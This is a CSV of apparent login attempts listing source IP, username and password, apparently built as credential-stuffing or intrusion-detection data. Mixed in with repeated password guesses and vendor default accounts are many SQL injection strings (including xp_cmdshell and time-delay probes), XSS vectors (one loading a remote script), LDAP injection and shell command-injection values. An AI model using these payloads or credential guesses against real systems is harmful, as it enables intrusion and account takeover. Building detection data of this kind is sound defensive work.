ip,username,password
175.222.190.19,wu,coolboy100%
226.253.243.175,miao,147258www.
155.1.252.198,gou,1/8monday
218.236.249.239,mu,vvvvv50%
66.106.187.234,%21,//*
202.205.157.195,xiao,shit@139.com
112.2.10.37,dmq,phplist
60.45.206.14,voadmin,OE
245.160.150.63,cui,)idctest@2010
162.16.86.133,yu,ma_wong78
226.253.243.175,miao,147258www.
175.222.190.19,wu,coolboy100%
155.1.252.198,gou,1/8monday
66.106.187.234,23 OR 1=1,desc
218.236.249.239,mu,vvvvv50%
112.2.10.37,dmq,icatch99
202.205.157.195,xiao,shit@139.com
60.45.206.14,voadmin,bsxpass
245.160.150.63,cui,idctest@2010
175.222.190.19,wu,coolboy100%
162.16.86.133,yu,a_wong78
226.253.243.175,miao,147258www.
218.236.249.239,mu,vvvvv50%
155.1.252.198,gou,1/monday
66.106.187.234,' or a=a--,t'exec master..xp_cmdshell 'nslookup www.google.com'--
112.2.10.37,dmq,SL
202.205.157.195,zhi,@qq.com80586
60.45.206.14,voadmin,mpegvideo
245.160.150.63,cui,idctest@2010
175.222.190.19,wu,coolboy100%
162.16.86.133,yu,a_wong78
226.253.243.175,miao,147258www.
155.1.252.198,gou,1/8monday
218.236.249.239,mu,vvvvv50%
66.106.187.234,-,%26
202.205.157.195,zhi,@qq.com80586
112.2.10.37,dmq,primeos
60.45.206.14,voadmin,0P3N
245.160.150.63,cui,idctest@2010
226.253.243.175,miao,147258www.
162.16.86.133,duan,5555555.com
175.222.190.19,wu,coolboy100%
66.106.187.234,' or uname like '%,%2A%28%7C%28mail%3D%2A%29%29
155.1.252.198,gou,1/8monday
218.236.249.239,mu,vvvvv50%
202.205.157.195,zhi,@qq.com80586
112.2.10.37,dmq,Passw0rd!
60.45.206.14,voadmin,AMIPSWD
245.160.150.63,cui,idctest@2010
162.16.86.133,duan,5555555.com
226.253.243.175,miao,147258www.
175.222.190.19,wu,coolboy100%
155.1.252.198,gou,1/8monday
218.236.249.239,mu,vvvvv50%
66.106.187.234,or,') and ('x'='x
112.2.10.37,dmq,!admin
202.205.157.195,zhi,@qq.com80586
245.160.150.63,cui,idctest@2010
60.45.206.14,voadmin,wrgg15_di524
83.6.103.3,a' waitfor delay '0:0:10'--,' or '' like '
162.16.86.133,duan,5555555.comg
226.253.243.175,miao,147258www.
66.106.187.234,""" or 0=0 #",x' AND members.email IS NULL; --
218.236.249.239,mu,vvvvv50%
155.1.252.198,gou,1/8monday
202.205.157.195,zhi,@qq.com80586
112.2.10.37,dmq,CCC
60.45.206.14,jdoe@geometrixx.info,computer
245.160.150.63,cui,idctest@2010
83.6.103.3,like,""" or 1=1 or """"="""
162.16.86.133,duan,5555555.cm
226.253.243.175,miao,147258www.
66.106.187.234,' or ''=',admin'--
218.236.249.239,mu,vvvvv50%
155.1.252.198,gou,1/8monday
112.2.10.37,DBSNMP,qsysopr
202.205.157.195,zhi,@qq.com80586
245.160.150.63,cui,idctest@2010
60.45.206.14,jdoe@geometrixx.info,etas
162.16.86.133,duan,5555555.com
226.253.243.175,miao,147258www.
83.6.103.3,' UNION ALL SELECT,' and 2>3--
218.236.249.239,mu,vvvvv50%
155.1.252.198,gou,1/8mondany
66.106.187.234,-,x' or 1=1 or 'x'='y
202.205.157.195,zhi,@qq.com0586
112.2.10.37,DBSNMP,ergc
60.45.206.14,jdoe@geometrixx.info,sangfor
245.160.150.63,cui,idctest@200
162.16.86.133,duan,5555555.com
83.6.103.3,tz_offset,"<>""'%;)(&+"
226.253.243.175,miao,147258www.
218.236.249.239,mu,vvvvv50%
66.106.187.234,truncate,0 or 1=1
155.1.252.198,gou,1/8monday
112.2.10.37,DBSNMP,weblogic1
202.205.157.195,zhi,@qq.com80586
60.45.206.14,jdoe@geometrixx.info,agent
245.160.150.63,cui,idctest@2010
83.6.103.3,'or''=',update
226.253.243.175,miao,147258www.
162.16.86.133,duan,5555555.com
155.1.252.198,gou,1/8monday
218.236.249.239,mu,vvvvv50%
66.106.187.234,distinct,#
112.2.10.37,DBSNMP,8429
202.205.157.195,zhi,@qq.com80586
60.45.206.14,jdoe@geometrixx.info,2wsx@WSX
217.6.11.53,"ABC<div style=""x:\x09expression(javascript:alert(413)"">DEF","<script\x09type=""text/javascript"">javascript:alert(1180);</script>"
83.6.103.3,//*,'
162.16.86.133,duan,5555555.com
226.253.243.175,miao,147258www.
218.236.249.239,cong,2nd~!@#$%^&*
155.1.252.198,gou,1/8monday
66.106.187.234,%20'sleep%2050',asc
112.2.10.37,DBSNMP,VIRUSER
202.205.157.195,zhi,@qq.com80586
217.6.11.53,"ABC<div style=""x:\x09expression(javascript:alert(1312)"">DEF","<object onError object onError=""javascript:javascript:alert(1230)""></object onError>"
60.45.206.14,jdoe@geometrixx.info,a000000
162.16.86.133,duan,5555555.com
83.6.103.3,"<>""'%;)(&+",' (select top 1
226.253.243.175,miao,1472n58www.
155.1.252.198,gou,1/8monday
66.106.187.234,' or '1'='1'--,?
218.236.249.239,cong,2nd~!@#$%^&*
202.205.157.195,zhi,@qq.com80586
112.2.10.37,DBSNMP,snmpd
60.45.206.14,oracle,TAHITI
217.6.11.53,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert(1665)"")}</STYLE>",">""'><img src=""javascript.:alert(12)"">"
83.6.103.3,&apos;%20OR,to_timestamp_tz
162.16.86.133,duan,5555555.com
226.253.243.175,miao,147258www.
155.1.252.198,gou,1/8monday
218.236.249.239,cong,2nd~!@#$%^&*
66.106.187.234,"""a"""" or 3=3--""",handler
202.205.157.195,zhi,@qq.com80586
112.2.10.37,DBSNMP,lkw
60.45.206.14,oracle,MGR.SYS
217.6.11.53,"<IMG SRC="" &#14;  javascript:alert(1645);"">","<IMG SRC=x onhashchange=""alert(1063))"">"
83.6.103.3,&,' or username like '%
162.16.86.133,duan,5555555.com
119.171.2.154,"<IMG SRC=x oncanplay=""alert(1107))"">",&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(1816);&quot;&gt;
66.106.187.234,""" or 1=1 or """"=""",""" or 1=1--"
218.236.249.239,cong,2nd~!@#$%^&*[
155.1.252.198,gou,1/8monday
112.2.10.37,DBSNMP,highspeed
202.205.157.195,zhi,@qq.com80586
217.6.11.53,<form><input formaction=javascript:alert(209) type=image src=http://brutelogic.com.br/webgun/img/youtube209.jpg>,"""`'><script>\xE2\x80\x8Ajavascript:alert(1412)</script>"
60.45.206.14,oracle,hi3518
83.6.103.3,or,",@variable"
162.16.86.133,duan,5555555.com
119.171.2.154,"<IMG SRC=x onload=""alert(1132))"">","<INPUT TYPE=""IMAGE"" SRC=""javascript:alert(1018);"">"
218.236.249.239,cong,2nd~!@#$%^&*
66.106.187.234,%26,hi') or ('a'='a
155.1.252.198,gou,1/8monday
112.2.10.37,DBSNMP,storageserver
202.205.157.195,zhi,@qq.com80586
60.45.206.14,oracle,Col2ogro2
217.6.11.53,"<DIV STYLE=""background-image: url(javascript:alert(1802))"">",<IMG SRC=`javascript:alert(718)`>
162.16.86.133,duan,5555555.com
83.6.103.3,%27%20or%201=1,' or uname like '%
119.171.2.154,"ABC<div style=""x:\xE2\x80\x81330expression(javascript:alert(1330)"">DEF","<;BR SIZE="";&;{alert(1907)}"";>;"
218.236.249.239,cong,2nd~!@#$%^&*
155.1.252.198,gou,1/8monday
66.106.187.234,%29,x' or 1=1 or 'x'='y
112.2.10.37,DBSNMP,sa
202.205.157.195,zhi,@qq.com80586
60.45.206.14,oracle,i2b2workdata
217.6.11.53,"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert(922);\""&gt;",&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(1846)&apos;;&lt;/STYLE&gt;
162.16.86.133,duan,5555555.com
83.6.103.3,%2A%7C,"""a"""" or 1=1--"""
119.171.2.154,"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1316)"">DEF","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(1669);"">"
155.1.252.198,gou,1/8monday
218.236.249.239,cong,2nd~!@#$%^&*
66.106.187.234,--,%2A%28%7C%28mail%3D%2A%29%29
112.2.10.37,mlusr,netgear1
202.205.157.195,zhi,@qq.com80586
60.45.206.14,oracle,266344
217.6.11.53,"<a href=""\xC2\xA0javascript:javascript:alert(436)"" id=""fuzzelement436"">test</a>","<body onunload body onunload=""javascript:javascript:alert(1238)""></body onunload>"
83.6.103.3,or%201=1,or
119.171.2.154,""">/XaDoS/><script>alert(1774)</script><script src=""http://www.site.com/XSS.js""></script>",<script x> alert(1707) </script 1707=2
162.16.86.133,duan,5555555.com
218.236.249.239,cong,2nd~!@X#$%^&*
155.1.252.198,gou,1/8monday
66.106.187.234,'hi' or 'x'='x';,asc
202.205.157.195,zhi,@qq.com80586
112.2.10.37,mlusr,ftppass
60.45.206.14,oracle,cc
217.6.11.53,"<IMG SRC=x ondrag=""alert(1095))"">","<script src=""data:text/javascript,alert(782)""></script>"
162.16.86.133,duan,5555555.com
83.6.103.3,!,%20$(sleep%2050)
119.171.2.154,"""`'><script>\x3Bjavascript:alert(1400)</script>","""`'><script>\xE514\x9A\x80javascript:alert(514)</script>"
218.236.249.239,cong,2nd~!@#$%^&*
155.1.252.198,gou,1/8monday
66.106.187.234,' UNION SELECT,PRINT
202.205.157.195,zhi,@qq.com80586
112.2.10.37,mlusr,dlanrecover
217.6.11.53,"""/><img/onerror=\x27javascript:alert(1440)\x27src=xxx:x />","ABC<div style=""x:expression\x00(javascript:alert(409)"">DEF"
60.45.206.14,oracle,MANAGER.SYS
162.16.86.133,duan,5555555.com
83.6.103.3,!,' or '' like '
119.171.2.154,"<a href=""\x4447javascript:javascript:alert(444)"" id=""fuzzelement444"">test</a>","<a href=""\xE2\x80\x85javascript:javascript:alert(482)"" id=""fuzzelement482"">test</a>"
218.236.249.239,cong,2nd~!@#$%^&*
155.1.252.198,gou,1/8monday
66.106.187.234,%20$(sleep%2050),"<>""'%;)(&+"
202.205.157.195,zhi,@qq.com80586
112.2.10.37,mlusr,MILLER
60.45.206.14,oracle,dni
217.6.11.53,&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert(908)&gt;&lt;/OBJECT&gt;,<IMG SRC=javascript:alert(936)>
83.6.103.3,delete,= ;
162.16.86.133,duan,5555555.com
119.171.2.154,"&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1858)&gt;","<a href=""\xE2\x80\x88javascript:javascript:alert(441)"" id=""fuzzelement441"">test</a>"
155.1.252.198,gou,1/8monday
218.236.249.239,cong,2nd~!@#$%^&*
66.106.187.234,asc,or 0=0 #
202.205.157.195,zhi,@qq.com80586
112.2.10.37,mlusr,2WSXcder
60.45.206.14,ssp,HPWORD
217.6.11.53,"<body onPopState body onPopState=""javascript:javascript:alert(1231)""></body onPopState>","<div/onmouseover='alert(1173)'> style=""x:"">"
162.16.86.133,duan,5555555.com
83.6.103.3,bfilename,\x27UNION SELECT
119.171.2.154,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert(1681)</SCRIPT>"">","perl -e 'print \""<IMG SRC=java\0script:alert(1755)>\"";' > out"
218.236.249.239,cong,2nd~!@#$%^&*
155.1.252.198,gou,1/8monday
66.106.187.234,) or (a=a,')%20or%20('x'='x
202.205.157.195,zhi,@qq.com80586
112.2.10.37,mlusr,router
60.45.206.14,ssp,password$123
217.6.11.53,"<a href=""javascript\x3Ajavascript:alert(364)"" id=""fuzzelement364"">test</a>","<iframe onLoad iframe onLoad=""javascript:javascript:alert(1195)""></iframe onLoad>"
162.16.86.133,duan,5555555.com
83.6.103.3,' or '1'='1'--,@variable
119.171.2.154,<<SCRIPT>alert(1969);//<</SCRIPT>,"<STYLE>li {list-style-image: url(\""javascript:alert(1753)\"");}</STYLE><UL><LI>XSS"
155.1.252.198,gou,1/8monday
218.236.249.239,cong,2nd~!@#$%^&*
66.106.187.234,\x27\x4F\x52 SELECT *,replace
112.2.10.37,mlusr,HLT
202.205.157.195,zhi,@qq.com80586
217.6.11.53,"""><script>alert(233)</script>","<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1603)"")}</STYLE>"
60.45.206.14,ssp,123
218.236.249.239,cong,2nd~!@#$%^&*
90.49.222.5,mou,s69!#%&(%
83.6.103.3,' or 0=0 --,%29
162.16.86.133,duan,5555555.com
119.171.2.154,"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(1900)"";)}<;/STYLE>;","<meta content=""&NewLine; 1686 &NewLine;; JAVASCRIPT&colon; alert(1686)"" http-equiv=""refresh""/>"
205.229.25.4,zhang,W0mbatdrug$
112.2.10.37,mlusr,otbu+1
202.205.157.195,zhi,@qq.com80586
60.45.206.14,ssp,infoseclab
217.6.11.53,"<IFRAME SRC=# onmouseover=""alert(1145)""></IFRAME>","<IMG onmouseover=""alert(1005)"">"
83.6.103.3,!,' or '' like '
218.236.249.239,cong,2nd~!@#$%^&*
119.171.2.154,"<img\x6030src=x onerror=""javascript:alert(603)"">","&lt;IMG SRC=\""jav&#x09;ascript&#058;alert(924);\""&gt;"
162.16.86.133,duan,5555555.com
205.229.25.4,zhang,W0mba)tdrug$
90.49.222.5,mou,s69!#%&(%
202.205.157.195,zhi,@qq.com80586
112.2.10.37,base,year2000
60.45.206.14,ssp,news
217.6.11.53,<body onscroll=javascript:alert(1610)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,"`""'><img src='#\x27 onerror=javascript:alert(363)>"
83.6.103.3,tz_offset,'hi' or 'x'='x';
119.171.2.154,<IMG SRC=”jav ascript:alert(842);”>,<? echo('<scr)'; echo('ipt>alert(1723)</script>'); ?>
162.16.86.133,duan,5555555.com
90.49.222.5,mou,s69!#%&(%
218.236.249.239,cong,2nd~!@#$%^&*
205.229.25.4,zhang,W0mbatdrug$
112.2.10.37,base,z123456
158.122.194.248,wei,6888e-mail
217.6.11.53,"<a href=""\xE2\x80\x81358javascript:javascript:alert(1358)"" id=""fuzzelement1358"">test</a>","<IMG SRC=x onemptied=""alert(1111))"">"
60.45.206.14,ssp,syslib
83.6.103.3,""" or 1=1--",PRINT
90.49.222.5,mou,s69!#%&(%
205.229.25.4,zhang,W0mbatdrug$
218.236.249.239,cong,2nd~!@#$%^&*
162.16.86.133,duan,5555555.com
119.171.2.154,"""`'><script>\x0Bjavascript:alert(535)</script>",<SCRIPT onreadystatechange=javascript:javascript:alert(1614);></SCRIPT>
112.2.10.37,base,654321
158.122.194.248,wei,6888e-mail
60.45.206.14,ssp,test123
217.6.11.53,"<IMG SRC=""jav ascript:alert(1640);"">","<IMG SRC=""jav	ascript:alert(1007);"">"
83.6.103.3,),) and (1=1
90.49.222.5,mou,s69!#:&(%
205.229.25.4,zhang,W0mbatdrug$
162.16.86.133,duan,5555555.com
218.236.249.239,cong,2nd~!@#$%^&*
119.171.2.154,<IMG SRC=javascript:alert(1002))>,"""`'><script>\x7Ejavascript:alert(1420)</script>"
112.2.10.37,base,t0ch88
22.12.151.150,yu,1%superman
158.122.194.248,wei,6888e-mail
217.6.11.53,"<IMG DYNSRC=""javascript:alert(1653)"">","<DIV STYLE=""background-image: url(javascript:alert(951))"">"
147.132.76.157,ACTrapUser,mountsys
205.229.25.4,zhang,W0mbatdrug$
90.49.222.5,mou,s69!#%&(%
119.171.2.154,"<div/onmouseover='alert(835)'> style=""x:"">","<IMG SRC=x oncut=""alert(1104))"">"
218.236.249.239,cong,2nd~!@#$%^&*
162.16.86.133,duan,5555555.com
22.12.151.150,yu,1%superman
217.6.11.53,"<BR SIZE=""&{javascript:alert(675)}"">",&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(1849);&quot;&gt;
112.2.10.37,base,lkwpeter
158.122.194.248,wei,6888e-mail
147.132.76.157,ACTrapUser,merlin
90.49.222.5,mou,s69!#%&(%
205.229.25.4,zhang,W0mbatdrug$
162.16.86.133,duan,5555555.com
119.171.2.154,http://www.google<script .com>alert(1688)</script,"<script\x0Atype=""text/javascript"">javascript:alert(1305);</script>"
218.236.249.239,cong,2nd~!@#$%^&*
112.2.10.37,base,admpw
217.6.11.53,<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(1894)>;<;/OBJECT>;,"<BGSOUND SRC=""javascript:alert(1024);"">"
22.12.151.150,yu,1%superman
158.122.194.248,wei,6888e-mail
147.132.76.157,ACTrapUser,REGO
90.49.222.5,mou,s69!#%&(%
205.229.25.4,zhang,W0mbatdrug$
218.236.249.239,cong,2nd~!@#$%^&*
119.171.2.154,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert(1036);"">","<img \x00src=x onerror=""javascript:alert(1525)"">"
162.16.86.133,duan,5555555.com
147.132.76.157,ACTrapUser,Aa123456789
217.6.11.53,"<marquee onStart marquee onStart=""javascript:javascript:alert(1216)""></marquee onStart>","'><SCRIPT>alert(1785))</SCRIPT><img src="""" alt='"
158.122.194.248,wei,6888e-mail
112.2.10.37,base,qxcomm1680
22.12.151.150,yu,1%superman
205.229.25.4,zhang,W0mbatdrug$
90.49.222.5,mou,s69!#%&(%
218.236.249.239,cong,2nd~!@#$%^&*
119.171.2.154,<img src=foo.png onerror=alert(1721) />,<script>({0:#0=eval/#0#/#0#(javascript:alert(649))})</script>
162.16.86.133,duan,5555555.com
147.132.76.157,ACTrapUser,bcnaspw
158.122.194.248,wei,6888e-mail
22.12.151.150,yu,1%superman
112.2.10.37,base,VIDEO
217.6.11.53,"<IMG SRC= onmouseover=""alert(1638)"">",<x onclick=alert(156)>click this!
90.49.222.5,mou,s69!#%&(%
205.229.25.4,zhang,W0mbatdrug$
218.236.249.239,cong,2nd~!@#$%^&*
119.171.2.154,"<img src onerror /"" '""= alt=javascript:alert(1548)//"">","\"";alert(943);//"
51.222.140.139,dan,c++58420
112.2.10.37,FSFTASK1,r@p8p0r+
147.132.76.157,tomcat,hsadb
217.6.11.53,"<script onLoad script onLoad=""javascript:javascript:alert(1217)""></script onLoad>",<body onscroll=javascript:alert(566)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
158.122.194.248,wei,6888e-mail
205.229.25.4,zhang,W0mbatdrug$
22.12.151.150,yu,1%superman
90.49.222.5,mou,s69!#%&(%
218.236.249.239,cong,2nd~!@#$%^&*
51.222.140.139,dan,c++58420
95.72.206.248,""" or ""a""=""a",' (select top 1
51.222.140.139,dan,c++58420
147.132.76.157,tomcat,core
112.2.10.37,FSFTASK1,TURBINE
158.122.194.248,wei,6888e-mail
95.72.206.248,x' AND 1=(SELECT COUNT(*) FROM tabname); --,%29
218.236.249.239,ji,.com31415926
217.6.11.53,"<script\x0Atype=""text/javascript"">javascript:alert(1305);</script>",<? echo('<SCR)';echo('IPT>alert(1047)</SCRIPT>'); ?>
90.49.222.5,mou,s69!#%&(%
22.12.151.150,yu,1%superman
205.229.25.4,zhang,W0mbatdrug$
112.2.10.37,FSFTASK1,noway
90.49.222.5,mou,s69!#%&(%
147.132.76.157,tomcat,db2admin
158.122.194.248,wei,6888e-mail
22.12.151.150,yu,1%superman
51.222.140.139,dan,c++58420
218.236.249.239,ji,.com31415926
95.72.206.248,'||UTL_HTTP.REQUEST,)
205.229.25.4,zhang,W0mbatdrug$
217.6.11.53,<input onfocus=javascript:alert(563) autofocus>,"<a onmouseover=""alert(999)"">xxs link</a>"
147.132.76.157,tomcat,e250changeme
112.2.10.37,FSFTASK1,dlanrecover
22.12.151.150,yu,1%sperman
90.49.222.5,mou,s69!#%&(%
51.222.140.139,dan,c++58420
158.122.194.248,wei,6888e-mail
218.236.249.239,ji,.com31415926
142.229.207.218,liu,09876.com
205.229.25.4,zhang,W0mbatdrug$
95.72.206.248,0 or 1=1,' or (EXISTS)
158.122.194.248,wei,6888e-mail
95.72.206.248,' or 1=1 or ''=',"hi"") or (""a""=""a"
51.222.140.139,dan,c++58420
112.2.10.37,FSFTASK1,OEMADM
147.132.76.157,tomcat,shiva
22.12.151.150,yu,1%superman
90.49.222.5,mou,s69!#%&(%
142.229.207.218,liu,09876.com
205.229.25.4,zhang,W0mbatdrug$
218.236.249.239,ji,.com31415E26
22.12.151.150,yu,1%superman
147.132.76.157,tomcat,D_SYSPW
51.222.140.139,dan,c++584K0
90.49.222.5,mou,s69!#%&(%
205.229.25.4,zhang,W0mbatdrug$
112.2.10.37,FSFTASK1,hpt
218.236.249.239,ji,.com3115926
158.122.194.248,wei,6888e-mail
95.72.206.248,x' AND 1=(SELECT COUNT(*) FROM tabname); --,like
142.229.207.218,liu,09876.com
51.222.140.139,dan,c++58420
158.122.194.248,wei,6888e-mail
90.49.222.5,mou,s69!#%&(%
22.12.151.150,yu,1%superman
142.229.207.218,liu,09876.com
205.229.25.4,zhang,W0mbatdrug$
147.132.76.157,7654321,Admin@storage
112.2.10.37,FSFTASK1,LdapPassword_1
218.236.249.239,ji,.com31415926
95.72.206.248,"hi"" or 1=1 --",'hi' or 'x'='x';
142.229.207.218,liu,09876.com
22.12.151.150,yu,1%superman
147.132.76.157,7654321,1q2w3e.
218.236.249.239,ji,.com31415926
90.49.222.5,mou,s69!#&(%
95.72.206.248,#,PRINT
112.2.10.37,FSFTASK1,QS_CBADM
51.222.140.139,dan,c++58420
158.122.194.248,wei,6888e-mail
205.229.25.4,zhang,W0mbatdrug$
218.236.249.239,ji,.com31415926
22.12.151.150,yu,1%superman
142.229.207.218,liu,09876.com
112.2.10.37,FSFTASK1,pw
147.132.76.157,7654321,SECAdmin1
205.229.25.4,zhang,W0mbatdrug$
51.222.140.139,dan,c++58420
90.49.222.5,mou,s69!#%&(%
95.72.206.248,' aND '' like '%,a' waitfor delay '0:0:10'--
158.122.194.248,wei,6888e-mail
218.236.249.239,ji,.com31415926
112.2.10.37,aaa,jstwo
95.72.206.248,' UNION SELECT,' or '' like '
51.222.140.139,dan,c++58420
147.132.76.157,7654321,topadmin
142.229.207.218,liu,09876.com
90.49.222.5,mou,s69!#%&(%
22.12.151.150,yu,1%suprrman
205.229.25.4,zhang,W0mbatdrug$
158.122.194.248,wei,68889e-mail
51.222.140.139,dan,c++58420
218.236.249.239,ji,.com31415926
147.132.76.157,7654321,ducati900ss
22.12.151.150,yu,1%superman
90.49.222.5,mou,s69!#%&(%
112.2.10.37,aaa,744
158.122.194.248,wei,6888e-mail
132.168.170.30,desc,admin'--
142.229.207.218,liu,09876.co>m
95.72.206.248,' or (EXISTS),'
142.229.207.218,liu,09876.com
147.132.76.157,7654321,rcustpw
158.122.194.248,wei,6888e-mail
112.2.10.37,aaa,browsepw
90.49.222.5,mou,s69!#%&(%
22.12.151.150,yu,1%superman
95.72.206.248,"hi"" or 1=1 --",23 OR 1=1
218.236.249.239,ji,.com314159p26
51.222.140.139,dan,c++58420
132.168.170.30,&lt;&gt;&quot;'%;)(&amp;+,'sqlattempt1
158.122.194.248,wei,6888e-mail
218.236.249.239,ji,.com31415926
132.168.170.30,%21,or%201=1
147.132.76.157,7654321,joeuser
51.222.140.139,dan,c++5820
112.2.10.37,aaa,QS_ADM
142.229.207.218,liu,09876.com
22.12.151.150,yu,1%superman
90.49.222.5,mou,s69!#%&(%
95.72.206.248,','%20or%201=1
51.222.140.139,dan,c++58420
90.49.222.5,mou,s69!#%&(%
158.122.194.248,wei,6888e-mail
147.132.76.157,7654321,NETPRIV
22.12.151.150,yu,1%superman
142.229.207.218,liu,09876.com
112.2.10.37,aaa,trouble
95.72.206.248,asc,' or 0=0 --
132.168.170.30,%2A%7C,@variable
218.236.249.239,ji,.com31415926
112.2.10.37,aaa,NETNONPRIV
22.12.151.150,yu,1%superman
95.72.206.248,' or 0=0 --,or a=a
218.236.249.239,ji,.com31415926
142.229.207.218,liu,09876.com
158.122.194.248,wei,6888e-mail
147.132.76.157,7654321,yankees
51.222.140.139,dan,c++58420
90.49.222.5,mou,69!#%&(%
132.168.170.30,' or username like '%,\x27UNION SELECT
51.222.140.139,dan,c++58420
218.236.249.239,ji,.com31415926
158.122.194.248,wei,6888e-mail
147.132.76.157,db_root_loacl,crftpw
90.49.222.5,mou,s69!#%&(%
112.2.10.37,aaa,Passwd@123
142.229.207.218,liu,09876.com
22.12.151.150,yu,1%superman
95.72.206.248,' and '' like ',' or ''='
132.168.170.30,anything' OR 'x'='x,'%20or%20''='
147.132.76.157,db_root_loacl,Bb123123
51.222.140.139,dan,c++58420
112.2.10.37,I2b2demodata,qsysopr
22.12.151.150,yu,1%superman
90.49.222.5,mou,s69!#%&(%
158.122.194.248,wei,6888e-mail
218.236.249.239,ji,.com31415926
132.168.170.30,?,*|
142.229.207.218,liu,09876.com
95.72.206.248,/,' AnD '' like '
95.72.206.248,hi or a=a,""" or 0=0 --"
147.132.76.157,db_root_loacl,Musii%1921
158.122.194.248,wei,6888e-mail
112.2.10.37,I2b2demodata,qwerty
22.12.151.150,yu,1%suerman
132.168.170.30,%28,like
251.235.43.207,"<img src=x onerror=\x15432""javascript:alert(1543)"">","<IMG SRC="" &#14;  javascript:alert(940);"">"
51.222.140.139,dan,c++58420
218.236.249.239,ji,.com31415926
142.229.207.218,liu,09876.coEm
147.132.76.157,db_root_loacl,AMI!SW
251.235.43.207,"<script\x0Dtype=""text/javascript"">javascript:alert(402);</script>",<iframe<?php echo chr(11)?> onload=alert(1743)></iframe>
22.12.151.150,yu,1%superman
51.222.140.139,dan,c++58420
218.236.249.239,ji,.com3115926
112.2.10.37,I2b2demodata,secofr
132.168.170.30,"<>""'%;)(&+",|
158.122.194.248,wei,6888e-mail
95.72.206.248,""") or (""a""=""a",&
142.229.207.218,liu,09876.com
147.132.76.157,db_root_loacl,LdapPassword_1
112.2.10.37,I2b2demodata,PUBSUB1
251.235.43.207,<img src=`xx:xx`onerror=alert(1700)>,"<STYLE>li {list-style-image: url(""javascript:javascript:alert(677)"");}</STYLE><UL><LI>XSS"
142.229.207.218,liu,09876.com
22.12.151.150,yu,1%superman
95.72.206.248,""" or 0=0 --",' or (EXISTS)
218.236.249.239,ji,.com31415926
158.122.194.248,wei,6888e-mail
51.222.140.139,dan,c++58420
132.168.170.30,&,distinct
158.122.194.248,wei,6888e-mail
218.236.249.239,ji,.com31415926
22.12.151.150,yu,1%superman
147.132.76.157,OUTLN,SECAdmin1
51.222.140.139,dan,c++58420
142.229.207.218,liu,09876.com
251.235.43.207,"<IMG SRC=""javascript:alert(1968)""","<DIV STYLE=""background-image: url(javascript:alert(1042))"">"
112.2.10.37,I2b2demodata,dare
132.168.170.30,|,'
95.72.206.248,%26,\x23
112.2.10.37,I2b2demodata,administrator123
142.229.207.218,liu,09876.com
147.132.76.157,OUTLN,CISINFO
51.222.140.139,dan,c++58420
158.122.194.248,xiao,@139.com111
218.236.249.239,ji,.com31415926
108.135.172.34,"""hi"""") or (""""a""""=""""a""",0 or 1=1
